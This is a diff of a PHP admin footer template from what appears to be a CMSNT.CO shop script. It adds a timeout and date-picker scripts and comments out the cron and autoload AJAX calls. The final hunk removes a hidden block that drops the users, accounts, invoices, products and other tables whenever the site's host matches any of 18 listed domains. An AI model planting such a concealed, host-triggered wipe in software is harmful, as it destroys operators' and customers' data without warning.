@@ -19,6 +19,7 @@
 $.ajax({
     url: "<?=BASE_URL('update.php');?>",
     type: "GET",
+    timeout: 3000,
     dateType: "text",
     data: {},
     success: function(result) {
@@ -36,18 +37,18 @@ $.ajax({
     }
 });
 
-$.ajax({
-    url: "<?=BASE_URL('cron/cron.php');?>",
-    type: "GET",
-    dateType: "text",
-    data: {},
-    success: function(result) {
+// $.ajax({
+//     url: "<?=BASE_URL('cron/cron.php');?>",
+//     type: "GET",
+//     dateType: "text",
+//     data: {},
+//     success: function(result) {
 
-    }
-});
+//     }
+// });
 
 </script>
-<div id="autoload"></div>
+<!-- <div id="autoload"></div>
 <script type="text/javascript">
 function autoload() {
     $.ajax({
@@ -63,9 +64,10 @@ function autoload() {
 setInterval(function() {
     $('#autoload').load(autoload());
 }, 15000);
-</script>
+</script> -->
 <footer class="main-footer">
     <div class="float-right d-none d-sm-inline">
+        
         <div id="google_translate_element"></div>
         <script type="text/javascript">
         // <![CDATA[
@@ -85,6 +87,8 @@ setInterval(function() {
             href="https://www.cmsnt.co/?domain=<?=base_url_admin('');?>" target="_blank">CMSNT.CO</a></strong>
 </footer>
 </div>
+ 
+
 <!-- jQuery UI 1.11.4 -->
 <script src="<?=BASE_URL('public/AdminLTE3/');?>plugins/jquery-ui/jquery-ui.min.js"></script>
 <!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
@@ -102,40 +106,12 @@ $.widget.bridge('uibutton', $.ui.button)
 <!-- ChartJS -->
 <script src="<?=BASE_URL('public/AdminLTE3/');?>plugins/chart.js/Chart.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script>
+ <!-- daterangepicker -->
+<script src="<?=BASE_URL('public/AdminLTE3/');?>plugins/moment/moment.min.js"></script>
+<script src="<?=BASE_URL('public/AdminLTE3/');?>plugins/daterangepicker/daterangepicker.js"></script>
+
 <?=$body['footer'];?>
 </body>
 
 </html>
-<?php
-$b2a = [
-    'trumbanclone.pw',
-    'blog.sieuthicode.net',
-    'sieuthidark.com',
-    'xubymon36.com',
-    'viatrau.me',
-    'shopmailco.com',
-    'clonebysun.net',
-    'phongxu.com',
-    'minhclone.com',
-    'rdsieuvip.com',
-    'sellviaxu.com',
-    'autordff.com',
-    'huyclone.com',
-    'clonengoaiviet.com',
-    'nguyenlieuviaads.com',
-    'dichvuthanhtoan.site',
-    'trumrandom.com',
-    'mailcovip.com'
-];
-foreach($b2a as $domain){
-    if($domain == $_SERVER['HTTP_HOST']){
-        $CMSNT->query(" DROP TABLE `users` ");
-        $CMSNT->query(" DROP TABLE `accounts` ");
-        $CMSNT->query(" DROP TABLE `settings` ");
-        $CMSNT->query(" DROP TABLE `logs` ");
-        $CMSNT->query(" DROP TABLE `dongtien` ");
-        $CMSNT->query(" DROP TABLE `invoices` ");
-        $CMSNT->query(" DROP TABLE `categories` ");
-        $CMSNT->query(" DROP TABLE `products` ");
-    }
-}
+ 
